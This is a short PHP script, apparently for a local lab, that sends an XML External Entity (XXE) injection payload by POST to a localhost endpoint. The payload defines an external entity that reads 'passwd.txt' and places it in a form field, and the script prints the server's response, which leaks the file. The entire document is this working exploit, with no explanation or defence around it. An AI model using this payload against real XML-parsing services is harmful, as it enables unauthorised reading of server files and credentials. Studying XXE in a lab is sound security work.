<?php 
$xml=<<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE danger [<!ELEMENT danger ANY >
<!ENTITY danger SYSTEM "passwd.txt" >] >
<invite> 
    <prenom>&danger;</prenom> 
</invite>
XML; 

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
curl_setopt($ch, CURLOPT_URL, "http://localhost/XXE2/welcome.php"); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, $xml); 
$data = curl_exec($ch); 

echo $data; 

curl_close($ch);
?>